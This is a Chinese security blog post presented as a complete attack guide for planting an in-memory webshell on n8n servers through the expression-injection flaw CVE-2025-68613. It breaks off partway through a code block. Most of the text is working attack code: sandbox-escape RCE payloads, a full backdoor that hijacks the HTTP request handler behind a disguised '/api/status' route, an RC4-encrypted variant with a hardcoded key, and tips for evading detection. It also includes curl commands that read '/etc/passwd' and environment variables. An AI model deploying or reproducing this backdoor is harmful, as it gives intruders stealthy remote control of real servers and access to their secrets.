---
permalink: 2025/12/31/n8n_memshell/
tags:
  - n8n
  - CVE-2025-68613
  - å†…å­˜é©¬
layout: post
date: '2025-12-31 08:00:00'
categories:
  - webå®‰å…¨
  - æ¼æ´åˆ†æ
home_cover: 'https://cdn.jsdelivr.net/gh/handbye/images@master/uPic/2025/12/5SrPnY.png'
title: CVE-2025-68613 n8n å†…å­˜é©¬å®Œæ•´æ”»å‡»æŒ‡å—
---

> **å®‰å…¨è­¦å‘Š**: æœ¬æ–‡æ¡£åŒ…å«çœŸå®æ”»å‡»æŠ€æœ¯ï¼Œä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•å’Œç ”ç©¶ã€‚æœªç»æˆæƒä½¿ç”¨æ˜¯è¿æ³•è¡Œä¸ºã€‚


é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š[https://xz.aliyun.com/news/91000](https://xz.aliyun.com/news/91000)


## **1. å†…å­˜é©¬åŸç†ä¸ç”Ÿæˆè¿‡ç¨‹**


### **1.1 ä»€ä¹ˆæ˜¯å†…å­˜é©¬**


**å†…å­˜é©¬** (Memory Shell / Memshell) æ˜¯ä¸€ç§æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼Œé€šè¿‡åœ¨ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œå®ç°æŒä¹…åŒ–æ§åˆ¶ï¼Œè€Œä¸åœ¨ç£ç›˜ä¸Šç•™ä¸‹ä»»ä½•æ–‡ä»¶ç—•è¿¹ã€‚


### **ä¼ ç»Ÿåé—¨ vs å†…å­˜é©¬**


| **ç‰¹æ€§** | **ä¼ ç»Ÿåé—¨** | **å†…å­˜é©¬**  |
| ------ | -------- | -------- |
| æ–‡ä»¶ç—•è¿¹   | âœ… å†™å…¥ç£ç›˜   | âŒ ä»…åœ¨å†…å­˜   |
| æŒä¹…æ€§    | è¿›ç¨‹é‡å¯åä»å­˜åœ¨ | è¿›ç¨‹é‡å¯åå¤±æ•ˆ  |
| æ£€æµ‹éš¾åº¦   | ä½ï¼ˆæ–‡ä»¶æ‰«æï¼‰  | é«˜ï¼ˆéœ€å†…å­˜åˆ†æï¼‰ |
| éƒ¨ç½²æ–¹å¼   | ä¸Šä¼ æ–‡ä»¶     | ä»£ç æ³¨å…¥     |
| éšè”½æ€§    | â­â­       | â­â­â­â­â­    |


### **1.2 n8nç¯å¢ƒä¸‹çš„å†…å­˜é©¬ç‰¹ç‚¹**


### **Node.js/Expressæ¶æ„**


n8nåŸºäºNode.jså’ŒExpressæ¡†æ¶ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š


```text
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Â  Â   n8n Application Â  Â  Â  Â  Â   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Express App (this.app) Â  Â  Â  Â  â”‚
â”‚ Â   â†“ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚  Router Stack (_router.stack) Â  â”‚
â”‚ Â   â”œâ”€ Middleware 1 Â  Â  Â  Â  Â  Â   â”‚
â”‚ Â   â”œâ”€ Middleware 2 Â  Â  Â  Â  Â  Â   â”‚
â”‚ Â   â””â”€ Route Handlers Â  Â  Â  Â  Â   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  HTTP Server Â  Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚ Â   â†“ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚  Request Event Handler Â  Â  Â  Â   â”‚
â”‚ Â   (server._events.request) Â  Â  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


### **å…³é”®å¯åŠ«æŒç‚¹**

1. **HTTPæœåŠ¡å™¨äº‹ä»¶** - `server._events.request`
2. **Expressä¸­é—´ä»¶æ ˆ** - `app._router.stack`
3. **å…¨å±€å¯¹è±¡** - `global.*`
4. **è¿›ç¨‹å¥æŸ„** - `process._getActiveHandles()`

### **1.3 å®Œæ•´ç”Ÿæˆæµç¨‹**


```mermaid
graph TB
    A[CVE-2025-68613 RCE] --> B[æ‰§è¡Œè¡¨è¾¾å¼æ³¨å…¥]
    B --> C[è·å–this.process.mainModule]
    C --> D[è·å–requireå‡½æ•°]
    D --> E[åŠ è½½child_processæ¨¡å—]
    E --> F[è·å–HTTP Serverå®ä¾‹]
    F --> G{é€‰æ‹©åŠ«æŒæ–¹å¼}
    G -->|æ–¹å¼1| H[åŠ«æŒ_events.request]
    G -->|æ–¹å¼2| I[æ³¨å…¥middlewareåˆ°_router.stack]
    H --> J[ä¿å­˜åŸå§‹handler]
    I --> J
    J --> K[åˆ›å»ºæ¶æ„handler]
    K --> L[å®ç°åé—¨é€»è¾‘]
    L --> M[è°ƒç”¨åŸå§‹handler]
    M --> N[å†…å­˜é©¬æ¤å…¥å®Œæˆ]
```


### **1.4 æŠ€æœ¯å®ç°åŸç†**


### **æ­¥éª¤1: è·å–requireå‡½æ•°**


```text
// é€šè¿‡RCEæ¼æ´è®¿é—®
var mainModule = this.process.mainModule;
var require = mainModule.require;

// ä¸ºä»€ä¹ˆå¯è¡Œï¼Ÿ
// - this åœ¨IIFEä¸­æŒ‡å‘dataä¸Šä¸‹æ–‡
// - data.process åŒ…å«çœŸå®çš„processå¯¹è±¡å¼•ç”¨
// - process.mainModule æ˜¯ä¸»æ¨¡å—
// - mainModule.require æ˜¯å®Œæ•´çš„requireå‡½æ•°
```


### **æ­¥éª¤2: å®šä½HTTPæœåŠ¡å™¨**


```text
// è·å–æ‰€æœ‰æ´»åŠ¨çš„handle
var handles = this.process._getActiveHandles();

// éå†æŸ¥æ‰¾HTTP Server
for (var i = 0; i < handles.length; i++) {
 Â  Â var h = handles[i];
 Â  Â // HTTP Serverç‰¹å¾ï¼šæœ‰_events.requestå±æ€§
 Â  Â if (h && h._events && h._events.request) {
 Â  Â  Â  Â httpServer = h;
 Â  Â  Â  Â break;
 Â   }
}
```


**ä¸ºä»€ä¹ˆè¿™æ ·å¯è¡Œï¼Ÿ**


Node.jsçš„HTTPæœåŠ¡å™¨ä¼šè¢«æ³¨å†Œä¸ºæ´»åŠ¨handleï¼Œé€šè¿‡ `_events.request` å¯ä»¥è¯†åˆ«å…¶ç±»å‹ã€‚


### **æ­¥éª¤3: åŠ«æŒè¯·æ±‚å¤„ç†å™¨**


```text
// ä¿å­˜åŸå§‹handler
var originalHandler = httpServer._events.request;

// åˆ›å»ºæ–°handlerï¼ˆåŒ…å«åé—¨é€»è¾‘ï¼‰
httpServer._events.request = function(req, res) {
 Â  Â // 1. æ£€æŸ¥æ˜¯å¦æ˜¯åé—¨è¯·æ±‚
 Â  Â if (req.url.indexOf('/api/status') === 0) {
 Â  Â  Â  Â // 2. æ‰§è¡Œæ¶æ„æ“ä½œ
 Â  Â  Â  Â execSync(command);
 Â  Â  Â  Â // 3. è¿”å›ç»“æœ
 Â  Â  Â  Â res.end(result);
 Â  Â  Â  Â return;
 Â   }

 Â  Â // 4. æ­£å¸¸è¯·æ±‚ä¼ é€’ç»™åŸå§‹handler
 Â  Â return originalHandler.call(this, req, res);
};
```


**å…³é”®ç‚¹**:

- æ‰€æœ‰HTTPè¯·æ±‚éƒ½ä¼šå…ˆç»è¿‡æˆ‘ä»¬çš„handler
- åé—¨è¯·æ±‚è¢«æ‹¦æˆªå¤„ç†
- æ­£å¸¸è¯·æ±‚é€æ˜ä¼ é€’ï¼Œä¸å½±å“ä¸šåŠ¡

### **æ­¥éª¤4: RC4åŠ å¯†é€šä¿¡å®ç°**


```text
function rc4(key, data) {
 Â  Â // 1. åˆå§‹åŒ–Sç›’
 Â  Â var s = [];
 Â  Â for (var i = 0; i < 256; i++) {
 Â  Â  Â  Â s[i] = i;
 Â   }

 Â  Â // 2. å¯†é’¥è°ƒåº¦ç®—æ³• (KSA)
 Â  Â var j = 0;
 Â  Â for (var i = 0; i < 256; i++) {
 Â  Â  Â  Â j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
 Â  Â  Â   [s[i], s[j]] = [s[j], s[i]]; Â // äº¤æ¢
 Â   }

 Â  Â // 3. ä¼ªéšæœºç”Ÿæˆç®—æ³• (PRGA)
 Â  Â var i = 0, j = 0;
 Â  Â var output = [];
 Â  Â for (var idx = 0; idx < data.length; idx++) {
 Â  Â  Â  Â i = (i + 1) % 256;
 Â  Â  Â  Â j = (j + s[i]) % 256;
 Â  Â  Â   [s[i], s[j]] = [s[j], s[i]]; Â // äº¤æ¢
 Â  Â  Â  Â var t = (s[i] + s[j]) % 256;
 Â  Â  Â  Â output[idx] = data[idx] ^ s[t]; Â // XORåŠ å¯†
 Â   }

 Â  Â return output;
}
```


**åŠ å¯†æµç¨‹**:


```text
æ˜æ–‡å‘½ä»¤ â†’ RC4åŠ å¯† â†’ Base64ç¼–ç  â†’ HTTPä¼ è¾“
 Â  Â  Â  Â  â†“
HTTPæ¥æ”¶ â†’ Base64è§£ç  â†’ RC4è§£å¯† â†’ æ‰§è¡Œå‘½ä»¤
 Â  Â  Â  Â  â†“
æ‰§è¡Œç»“æœ â†’ RC4åŠ å¯† â†’ Base64ç¼–ç  â†’ HTTPå“åº”
```


### **1.5 æŒä¹…åŒ–æœºåˆ¶**


### **è¿›ç¨‹çº§æŒä¹…åŒ–**


```text
// å­˜å‚¨åœ¨å…¨å±€å¯¹è±¡ä¸­
global.ge0b8a = {
 Â  Â process: function(data) {
 Â  Â  Â  Â // æŒä¹…åŒ–çš„æ‰§è¡Œå™¨
 Â  Â  Â  Â return execSync(data.toString());
 Â   }
};

// ä¼˜åŠ¿ï¼š
// 1. è·¨è¯·æ±‚è®¿é—®
// 2. åŠ¨æ€æ›´æ–°åŠŸèƒ½
// 3. å†…å­˜ä¸­ä¸å¯è§
```


### **åŠ¨æ€Payloadæ³¨å…¥**


```text
if (global.ge0b8a === undefined) {
    // é¦–æ¬¡è¯·æ±‚ï¼šæ³¨å…¥payload
    var payloadCode = decrypted.toString();
    var tmpPayload = new Function(payloadCode)();
    global.ge0b8a = tmpPayload;
}

// åç»­è¯·æ±‚ï¼šç›´æ¥ä½¿ç”¨
var result = global.ge0b8a.process(decrypted);
```


### **1.6 å…³é”®æŠ€æœ¯æŒ‘æˆ˜ä¸è§£å†³**


### **æŒ‘æˆ˜1: Bufferå¯¹è±¡ä¸å¯ç”¨**


**é—®é¢˜**: åœ¨è¡¨è¾¾å¼ç¯å¢ƒä¸­ `Buffer` ä¸æ˜¯å…¨å±€å¯¹è±¡


**è§£å†³**:


```text
var Buffer = require('buffer').Buffer;
```


### **æŒ‘æˆ˜2: Constructoræ£€æµ‹**


**é—®é¢˜**: ä»£ç ä¸­çš„ `.constructor` ä¼šè§¦å‘å®‰å…¨æ£€æµ‹


**è§£å†³**: ä½¿ç”¨å¯¹è±¡ç‰¹å¾è€Œéç±»å‹åç§°


```text
// âŒ è§¦å‘æ£€æµ‹
if (h.constructor.name === 'Server')

// âœ… ç»•è¿‡æ£€æµ‹
if (h._events && h._events.request)
```


### **æŒ‘æˆ˜3: POST Bodyè§£æ**


**é—®é¢˜**: Expressçš„body-parserå¯èƒ½å·²æ¶ˆè´¹body


**è§£å†³**: åœ¨ä¸­é—´ä»¶ä¹‹å‰åŠ«æŒï¼Œæ‰‹åŠ¨è§£æ


```text
req.on('data', function(chunk) {
    body += chunk.toString();
});

req.on('end', function() {
    var json = JSON.parse(body);
    // å¤„ç†...
});
```


### **1.7 æ¶æ„è®¾è®¡**


### **åˆ†å±‚æ¶æ„**


```text
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     åº”ç”¨å±‚ (Application Layer)       â”‚
â”‚  - Pythonå®¢æˆ·ç«¯                      â”‚
â”‚  - å‘½ä»¤åŠ å¯†/è§£å¯†                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â†“ HTTP/HTTPS
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     ä¼ è¾“å±‚ (Transport Layer)         â”‚
â”‚  - Base64ç¼–ç                         â”‚
â”‚  - JSONåŒ…è£…                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     åŠ å¯†å±‚ (Encryption Layer)        â”‚
â”‚  - RC4ç®—æ³•                           â”‚
â”‚  - å¯†é’¥: 3c6e0b8a9c15224a            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     åŠ«æŒå±‚ (Hijack Layer)            â”‚
â”‚  - HTTP Request Handler              â”‚
â”‚  - è·¯ç”±åŒ¹é…: /api/status             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     æ‰§è¡Œå±‚ (Execution Layer)         â”‚
â”‚  - global.ge0b8a.process()           â”‚
â”‚  - child_process.execSync()          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


### **æ•°æ®æµ**


```text
å®¢æˆ·ç«¯å‘½ä»¤ "whoami"
    â†“
RC4åŠ å¯†: [0x7A, 0xA8, 0xF5, 0x5D, 0x2E, 0x3A]
    â†“
Base64ç¼–ç : "7Kj1XS46"
    â†“
JSONå°è£…: {"data": "7Kj1XS46"}
    â†“
HTTP POST â†’ n8næœåŠ¡å™¨
    â†“
Request Handleræ‹¦æˆª
    â†“
Base64è§£ç  â†’ RC4è§£å¯† â†’ "whoami"
    â†“
execSync("whoami") â†’ "node\n"
    â†“
RC4åŠ å¯† â†’ Base64ç¼–ç 
    â†“
JSONå“åº”: {"data": "9a/+WUk="}
    â†“
å®¢æˆ·ç«¯è§£å¯† â†’ "node\n"
```


### **1.8 å®‰å…¨ç»•è¿‡æŠ€æœ¯**


### **ç»•è¿‡1: è¡¨è¾¾å¼å®‰å…¨æ£€æµ‹**


```text
// n8nçš„å®‰å…¨æ£€æµ‹
const constructorValidation = new RegExp(/\.\\s*constructor/gm);

// ç»•è¿‡æ–¹æ³•ï¼š
// 1. ä¸ä½¿ç”¨.constructor
// 2. ä½¿ç”¨å¯¹è±¡ç‰¹å¾æ£€æµ‹
// 3. ä½¿ç”¨typeofåˆ¤æ–­
```


### **ç»•è¿‡2: ç¯å¢ƒéš”ç¦»**


```text
// é—®é¢˜ï¼šè¡¨è¾¾å¼åœ¨æ²™ç®±ä¸­æ‰§è¡Œ
// è§£å†³ï¼šé€šè¿‡this.processçªç ´æ²™ç®±
var mainModule = this.process.mainModule;  // âœ…
var mainModule = process.mainModule;       // âŒ å¯èƒ½å¤±è´¥
```


### **ç»•è¿‡3: æ—¥å¿—æ£€æµ‹**


```text
// ä½¿ç”¨éšè”½çš„ç«¯ç‚¹å
'/api/status'     // çœ‹èµ·æ¥åƒçŠ¶æ€æ£€æŸ¥
'/health-monitor' // çœ‹èµ·æ¥åƒå¥åº·ç›‘æ§
'/system-check'   // çœ‹èµ·æ¥åƒç³»ç»Ÿæ£€æŸ¥

// é¿å…æ•æ„Ÿå…³é”®è¯
// âŒ '/backdoor', '/shell', '/hack'
// âœ… '/api/status', '/health', '/monitor'
```


### **1.9 ç”Ÿæˆæµç¨‹å®æˆ˜æ¼”ç¤º**


### **é˜¶æ®µ1: RCEéªŒè¯**


```text
{{
    (function() {
        // æµ‹è¯•RCE
        return this.process.mainModule.require('child_process')
            .execSync('whoami', {encoding: 'utf8'});
    })()
}}
```


**è¾“å‡º**: `node`


### **é˜¶æ®µ2: å®šä½HTTPæœåŠ¡å™¨**


```text
{{
    (function() {
        var handles = this.process._getActiveHandles();
        var serverFound = false;

        for (var i = 0; i < handles.length; i++) {
            if (handles[i]._events && handles[i]._events.request) {
                serverFound = true;
                break;
            }
        }

        return 'HTTP Server found: ' + serverFound;
    })()
}}
```


**è¾“å‡º**: `HTTP Server found: true`


### **é˜¶æ®µ3: æ¤å…¥åŸºç¡€åé—¨**


```text
{{
    (function() {
        // å®Œæ•´çš„å†…å­˜é©¬æ¤å…¥ä»£ç 
        // ï¼ˆè§ç¬¬4ç« èŠ‚ï¼‰
        return JSON.stringify({success: true});
    })()
}}
```


### **é˜¶æ®µ4: éªŒè¯åé—¨**


```text
curl "http://localhost:5678/api/status?cmd=whoami"
```


**è¾“å‡º**: `{"ok":true,"data":"node\n"}`


![image.png](../post_images/0633d46d426e4489531cd7f006434b9e.png)


### **é˜¶æ®µ5: å‡çº§åˆ°åŠ å¯†ç‰ˆæœ¬**


```text
{{
    (function() {
        // RC4åŠ å¯†ç‰ˆæœ¬
        // ï¼ˆè§ç¬¬5ç« èŠ‚ï¼‰
        return JSON.stringify({success: true, encrypted: true});
    })()
}}
```


### **1.10 åŸç†æ€»ç»“**


å†…å­˜é©¬çš„æœ¬è´¨æ˜¯**è¿›ç¨‹å†…å­˜åŠ«æŒ**ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ï¼š

1. **çªç ´æ²™ç®±** - åˆ©ç”¨RCEè®¿é—®çœŸå®çš„processå¯¹è±¡
2. **å®šä½ç›®æ ‡** - æ‰¾åˆ°HTTPæœåŠ¡å™¨å®ä¾‹
3. **åŠ«æŒå…¥å£** - æ›¿æ¢è¯·æ±‚å¤„ç†å‡½æ•°
4. **é€æ˜ä»£ç†** - åœ¨å¤„ç†åé—¨è¯·æ±‚åç»§ç»­æ­£å¸¸ä¸šåŠ¡
5. **æŒä¹…åŒ–** - å°†payloadå­˜å‚¨åœ¨globalå¯¹è±¡
6. **åŠ å¯†é€šä¿¡** - ä½¿ç”¨RC4ä¿è¯é€šä¿¡éšè”½æ€§

**ä¼˜åŠ¿**:

- âœ… æ— æ–‡ä»¶è½åœ°
- âœ… éš¾ä»¥æ£€æµ‹
- âœ… ä¸å½±å“ä¸šåŠ¡
- âœ… åŠŸèƒ½å¼ºå¤§

**é™åˆ¶**:

- âŒ è¿›ç¨‹é‡å¯å¤±æ•ˆ
- âŒ éœ€è¦RCEå‰æ
- âŒ å¯è¢«è¿è¡Œæ—¶æ£€æµ‹

---


## **2. æ¼æ´åˆ†æ**


---


## **1. æ¼æ´åˆ†æ**


### **CVE-2025-68613: n8n è¡¨è¾¾å¼æ³¨å…¥ RCE**


**æ¼æ´ç‰ˆæœ¬**: n8n < v1.122.0  
**CVSSè¯„åˆ†**: 10.0 (ä¸¥é‡)  
**çŠ¶æ€**: å·²éªŒè¯


### **æ ¸å¿ƒæ¼æ´**


ä¸‰ä¸ªå®‰å…¨ç¼ºé™·çš„ç»„åˆåˆ©ç”¨ï¼š

1. **IIFE çš„** **`this`** **ä¸Šä¸‹æ–‡æœªæ¸…ç†** - ä¸»è¦æ¼æ´
2. **åå¼•å·ç»•è¿‡ constructor æ£€æµ‹**
3. **`process`** **å¯¹è±¡æš´éœ²ç¯å¢ƒå˜é‡**

### **æ”»å‡»æµç¨‹**


```text
ç”¨æˆ·è¾“å…¥æ¶æ„è¡¨è¾¾å¼
         â†“
{{ (function() { ... })() }}
         â†“
Expression.resolveSimpleParameterValue()
         â†“
åˆ›å»º data ä¸Šä¸‹æ–‡ (åŒ…å« process å¯¹è±¡)
         â†“
Tournament.execute()
         â†“
å‡½æ•°ä»¥ data ä½œä¸º this æ‰§è¡Œ
         â†“
this.process.mainModule.require
         â†“
è®¿é—® child_process æ¨¡å—
         â†“
execSync() æ‰§è¡Œç³»ç»Ÿå‘½ä»¤
         â†“
ğŸ”¥ å®Œæ•´ RCEï¼
```


### **åŸºç¡€RCEæµ‹è¯•**


```text
{{
    (function() {
        return this.process.mainModule.require('child_process')
            .execSync('id', {encoding: 'utf8'}).trim();
    })()
}}
```


**é¢„æœŸè¾“å‡º**: `uid=1000(n8n) gid=1000(n8n) groups=1000(n8n)`


![image.png](../post_images/40e468ca2531242f9dcaf09e0625f133.png)


---


## **2. ç¯å¢ƒå‡†å¤‡**


### **2.1 å¯åŠ¨n8nå®ä¾‹**


```text
# Dockeræ–¹å¼
docker run -it --rm \
  --name n8n \
  -p 5678:5678 \
  -e N8N_BLOCK_ENV_ACCESS_IN_NODE=false \
  n8nio/n8n:1.120.3
```


### **2.2 éªŒè¯æ¼æ´**

1. è®¿é—® `http://localhost:5678`
2. åˆ›å»ºæ–°å·¥ä½œæµ

	![image.png](../post_images/0d0ef6e131475d2a629160af6f914fad.png)

3. æ·»åŠ  "Set" èŠ‚ç‚¹,ç¼–è¾‘fields

	![image.png](../post_images/87c519c5ed77b4e5553f1513f9823ba3.png)

4. æ‰§è¡ŒåŸºç¡€RCEæµ‹è¯•è½½è·

---


## **3. åŸºç¡€å†…å­˜é©¬**


### **3.1 ç®€å•Webåé—¨ (æ¨èå…¥é—¨)**


**ç‰¹ç‚¹**: GETè¯·æ±‚ï¼Œæ˜æ–‡å‘½ä»¤ï¼Œæ˜“äºä½¿ç”¨


```text
{{
    (function() {
        try {
            var mainModule = this.process.mainModule;
            var require = mainModule.require;
            var execSync = require('child_process').execSync;

            var handles = this.process._getActiveHandles();
            var httpServer = null;

            for (var i = 0; i < handles.length; i++) {
                var h = handles[i];
                if (h && h._events && h._events.request) {
                    httpServer = h;
                    break;
                }
            }

            if (!httpServer) {
                return JSON.stringify({success: false, error: 'Server not found'});
            }

            var originalReqHandler = httpServer._events.request;

            httpServer._events.request = function(req, res) {
                if (req.url && req.url.indexOf('/api/status') === 0) {
                    var match = req.url.match(/[?&]cmd=([^&]+)/);
                    if (match && match[1]) {
                        try {
                            var cmd = decodeURIComponent(match[1]);
                            var output = execSync(cmd, {encoding: 'utf8', timeout: 10000});
                            res.writeHead(200, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify({ok: true, data: output}));
                            return;
                        } catch(e) {
                            res.writeHead(500, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify({ok: false, err: e.message}));
                            return;
                        }
                    }
                }

                return originalReqHandler.call(this, req, res);
            };

            return JSON.stringify({
                success: true,
                message: 'Simple backdoor installed',
                endpoint: '/api/status?cmd=<command>',
                test: 'curl "http://localhost:5678/api/status?cmd=whoami"'
            }, null, 2);

        } catch(err) {
            return JSON.stringify({success: false, error: err.message});
        }
    })()
}}
```


### **3.2 ä½¿ç”¨æ–¹æ³•**


```text
# æµ‹è¯•åé—¨
curl "http://localhost:5678/api/status?cmd=whoami"

# é¢„æœŸè¾“å‡º
{"ok":true,"data":"node\n"}
```


### **3.3 å¸¸ç”¨å‘½ä»¤**


```text
# ç³»ç»Ÿä¿¡æ¯
curl "http://localhost:5678/api/status?cmd=uname -a"

# å½“å‰ç›®å½•
curl "http://localhost:5678/api/status?cmd=pwd"

# åˆ—å‡ºæ–‡ä»¶
curl "http://localhost:5678/api/status?cmd=ls -la"

# ç¯å¢ƒå˜é‡
curl "http://localhost:5678/api/status?cmd=env"

# è¯»å–æ–‡ä»¶
curl "http://localhost:5678/api/status?cmd=cat /etc/passwd"
```


---


## **4. é«˜çº§åŠ å¯†å†…å­˜é©¬**


ï½œå“¥æ–¯æ‹‰çš„å†…å­˜é©¬ï¼Œæˆ‘æ²¡è°ƒè¯•æˆåŠŸï¼Œæœ‰å“ªä½å¸ˆå‚…æˆåŠŸäº†ï¼Œå¯ä»¥ç•™ä¸ªè¨€ï¼Œæ„Ÿè°¢ï¼


### **4.1 RC4åŠ å¯†ç‰ˆæœ¬**


**ç‰¹ç‚¹**:

- âœ… RC4åŠ å¯†é€šä¿¡
- âœ… Base64ç¼–ç ä¼ è¾“
- âœ… åŠ¨æ€Payloadæ³¨å…¥
- âœ… æŒä¹…åŒ–Handler
- âœ… æ”¯æŒGETå’ŒPOSTåŒæ¨¡å¼

```text
{{
    (function() {
        try {
            var mainModule = this.process.mainModule;
            var require = mainModule.require;
            var execSync = require('child_process').execSync;
            var Buffer = require('buffer').Buffer;

            // RC4åŠ å¯†ç®—æ³•
            function rc4(key, data) {
                var s = [], k = [];
                var i, j = 0, tmp;
                for (i = 0; i < 256; i++) {
                    s[i] = i;
                    k[i] = key.charCodeAt(i % key.length);
                }
                for (i = 0; i < 256; i++) {
                    j = (j + s[i] + k[i]) % 256;
                    tmp = s[i]; s[i] = s[j]; s[j] = tmp;
                }
                i = j = 0;
                var out = [];
                for (var idx = 0; idx < data.length; idx++) {
                    i = (i + 1) % 256;
                    j = (j + s[i]) % 256;
                    tmp = s[i]; s[i] = s[j]; s[j] = tmp;
                    var t = (s[i] + s[j]) % 256;
                    out[idx] = data[idx] ^ s[t];
                }
                return Buffer.from(out);
            }

            var handles = this.process._getActiveHandles();
            var httpServer = null;

            for (var i = 0; i < handles.length; i++) {
                var h = handles[i];
                if (h && h._events && h._events.request) {
                    httpServer = h;
                    break;
                }
            }

            if (!httpServer) {
                return JSON.stringify({success: false, error: 'Server not found'});
            }

            var originalHandler = httpServer._events.request;

            httpServer._events.request = function(req, res) {
                var isBackdoor = false;

                if (req.url && (req.url === '/api/status' || req.url.indexOf('/api/status?') === 0 || req.url.indexOf('/api/status/') === 0)) {
                    isBackdoor = true;
                }

                if (isBackdoor && req.method === 'POST') {
                    var body = '';

                    req.on('data', function(chunk) {
                        body += chunk.toString();
                    });

                    req.on('end', function() {
                        try {
                            var json = JSON.parse(body);
                            var key = '3c6e0b8a9c15224a';

                            if (json.data) {
                                var encrypted = Buffer.from(json.data, 'base64');
                                var decrypted = rc4(key, encrypted);

                                var g = global;

                                if (g.ge0b8a === undefined) {
                                    try {
                                        var payloadCode = decrypted.toString();
                                        var tmpPayload = new Function(payloadCode)();
                                        if (typeof tmpPayload === 'object' && typeof tmpPayload.process === 'function') {
                                            g.ge0b8a = tmpPayload;
                                        }
                                    } catch(e) {}
                                }

                                var result;
                                if (g.ge0b8a !== undefined) {
                                    result = g.ge0b8a['process'].call(g.ge0b8a, decrypted);
                                } else {
                                    var cmd = decrypted.toString();
                                    result = execSync(cmd, {encoding: 'utf8', timeout: 10000});
                                }

                                var resultBuffer = Buffer.isBuffer(result) ? result : Buffer.from(result);
                                var encryptedResult = rc4(key, resultBuffer);

                                res.writeHead(200, {'Content-Type': 'application/json'});
                                res.end(JSON.stringify({data: encryptedResult.toString('base64')}));
                                return;
                            }
                        } catch(e) {
                            res.writeHead(500, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify({data: null, error: e.message}));
                            return;
                        }

                        res.writeHead(200, {'Content-Type': 'application/json'});
                        res.end(JSON.stringify({data: null}));
                    });

                    return;
                }

                // GETæ–¹å¼ï¼ˆç®€åŒ–ï¼‰
                if (isBackdoor && req.method === 'GET') {
                    var match = req.url.match(/[?&]cmd=([^&]+)/);
                    if (match && match[1]) {
                        try {
                            var cmd = decodeURIComponent(match[1]);
                            var output = execSync(cmd, {encoding: 'utf8'});
                            res.writeHead(200, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify({ok: true, data: output}));
                            return;
                        } catch(e) {
                            res.writeHead(500, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify({ok: false, err: e.message}));
                            return;
                        }
                    }

                    res.writeHead(200, {'Content-Type': 'application/json'});
                    res.end(JSON.stringify({
                        status: 'ready',
                        encrypted: global.ge0b8a !== undefined,
                        methods: ['GET ?cmd=xxx', 'POST with encrypted data']
                    }));
                    return;
                }

